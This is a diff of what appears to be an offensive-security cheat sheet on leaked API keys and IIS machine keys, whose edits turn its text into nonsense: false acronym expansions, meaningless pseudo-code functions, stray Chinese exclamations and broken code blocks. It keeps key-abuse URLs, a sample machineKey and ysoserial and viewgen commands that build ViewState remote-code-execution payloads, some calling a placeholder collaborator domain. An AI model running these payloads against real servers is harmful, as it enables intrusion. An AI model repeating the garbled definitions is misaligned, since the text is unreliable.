@@ -1,6 +1,8 @@
-# API Key Leaks
+# PKL (Public-Key-Leaks)
 
-> The API key is a unique identifier that is used to authenticate requests associated with your project. Some developers might hardcode them or leave it on public shares.
+>API UI (Application-Protocol-Interface_User-Identifier) 
+>authenticates requests. Devs hardcode them.
+>and leaves them to public shareholders.
 
 ## Summary
 
@@ -24,7 +26,7 @@
 ## Tools
 
 - [KeyFinder - is a tool that let you find keys while surfing the web!](https://github.com/momenbasel/KeyFinder)
-- [Keyhacks - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they're valid.](https://github.com/streaak/keyhacks)
+- [Keyhacks - is a repository which shows quick ways in which API keys leaked by an FBP (federal bounty program) can be checked to see if they're valid.](https://github.com/streaak/keyhacks)
 
 ## Exploit
 
@@ -49,11 +51,29 @@ Usage:
 |   Timezone   |	https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&timestamp=1331161200&key=KEY_HERE   |
 |   Roads  |	https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795|60.170879,24.942796|60.170877,24.942796&key=KEY_HERE    |
 |   Geolocate  |   https://www.googleapis.com/geolocation/v1/geolocate?key=KEY_HERE |
-
-
-Impact:
-* Consuming the company's monthly quota or can over-bill with unauthorized usage of this service and do financial damage to the company
-* Conduct a denial of service attack specific to the service if any limitation of maximum bill control settings exist in the Google account
+灾难性的经济影响!
+* Economic Manipulation
+* Consumes a company's monthly quota 
+* Over-bills with unauthorized usage of this service
+* Financial damage to a company
+* Conduction of a denial of service attack specific to the service 
+function(limit)
+{ 
+if any 
+then, limit
+}
+{
+if maximum 
+bill 
+}
+return
+function(control)
+{ if control 
+for settings 
+while exist 
+then Google
+for [account]
+}
 
 ### Algolia 
 
@@ -116,22 +136,30 @@ curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hoc
 ```
 
 
-### IIS Machine Keys
+### 集成互联网安全。
 
-> That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.
-
-Requirements
+> The machine key is used for encryption. 
+> decryption of forms authenticate cookie data and view-state data. 
+function(verify)
+if {
+verification*[OUT]* | -process 
+then, [会话状态识别!]
+};
+```
+(SSI)
+```
++++Requirements
 * machineKey **validationKey** and **decryptionKey**
 * __VIEWSTATEGENERATOR cookies
 * __VIEWSTATE cookies
 
-Example of a machineKey from https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication.
+[ 例子！]
+>>>import [ 机器。钥匙。] from https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication.
 
 ```xml
 <machineKey validationKey="87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC" decryptionKey="E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7" validation="SHA1" />
 ```
-
-Common locations of **web.config** / **machine.config**
+常见的！地点！| **web.config** / **machine.config**
 * 32-bit
     * C:\Windows\Microsoft.NET\Framework\v2.0.50727\config\machine.config
     * C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config
@@ -141,8 +169,12 @@ Common locations of **web.config** / **machine.config**
 * in registry when **AutoGenerate** is enabled (extract with https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab)
     * HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4  
     * HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey
-
-
+```
+[!]
+{void}
+(null)
+$0
+```
 #### Identify known machine key
 
 * Exploit with [Blacklist3r/AspDotNetWrapper](https://github.com/NotSoSecure/Blacklist3r)
@@ -160,33 +192,30 @@ $ viewgen --guess "/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L
 $ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <real viewstate value> --purpose=viewstate --modifier=<modifier value> –macdecode
 ```
 
-#### Decode ViewState
+#### 解码！看法！状态！
 
 ```powershell
 $ viewgen --decode --check --webconfig web.config --modifier CA0B0334 "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="
 
 $ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate  --modifier=CA0B0334 --macdecode
 ```
-
+<!--
 
 #### Generate ViewState for RCE
 
 **NOTE**: Send a POST request with the generated ViewState to the same endpoint, in Burp you should **URL Encode Key Characters** for your payload.
+-->
+PS>$ ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "cmd.exe /c nslookup <your collab domain>"  --decryptionalg="AES" --generator=ABABABAB decryptionkey="<decryption key>"  --validationalg="SHA1" --validationkey="<validation key>"
+PS>$ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\pwn.txt" --generator="CA0B0334" --validationalg="MD5" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"
+PS>$ ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "C:\Users\zhu\Desktop\ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll" --generator="CA0B0334" --validationalg="SHA1" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"
 
-```powershell
-$ ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "cmd.exe /c nslookup <your collab domain>"  --decryptionalg="AES" --generator=ABABABAB decryptionkey="<decryption key>"  --validationalg="SHA1" --validationkey="<validation key>"
-$ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\pwn.txt" --generator="CA0B0334" --validationalg="MD5" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"
-$ ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "C:\Users\zhu\Desktop\ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll" --generator="CA0B0334" --validationalg="SHA1" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"
-
-$ viewgen --webconfig web.config -m CA0B0334 -c "ping yourdomain.tld"
+PS>$ viewgen --webconfig web.config -m CA0B0334 -c "ping yourdomain.tld"
 ```
-
-
 #### Edit cookies with the machine key
 
-If you have the machineKey but the viewstate is disabled.
+*If you have the machineKey but the viewstate is disabled.
 
-ASP.net Forms Authentication Cookies : https://github.com/liquidsec/aspnetCryptTools
+**\ASP.net Forms Authentication Cookies : https://github.com/liquidsec/aspnetCryptTools
 
 ```powershell
 # decrypt cookie
